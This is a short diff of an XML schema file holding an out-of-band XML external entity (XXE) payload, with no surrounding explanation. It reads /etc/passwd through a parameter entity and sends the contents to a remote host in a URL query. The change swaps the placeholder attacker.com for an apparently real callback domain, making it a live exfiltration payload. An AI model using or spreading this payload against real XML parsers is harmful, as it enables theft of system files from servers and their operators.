@@ -1,6 +1,6 @@
 <!DOCTYPE xs:schema [
     <!ENTITY % payload SYSTEM "file:///etc/passwd">
-    <!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%payload;'>">
+    <!ENTITY % wrapper "<!ENTITY &#x25; exfil SYSTEM 'http://azdl524mtsvhn4bpq7ghkcbcw32uqzeo.c.p0w.pw/?data=%payload;'>">
     %wrapper;
     %exfil;
 ]>
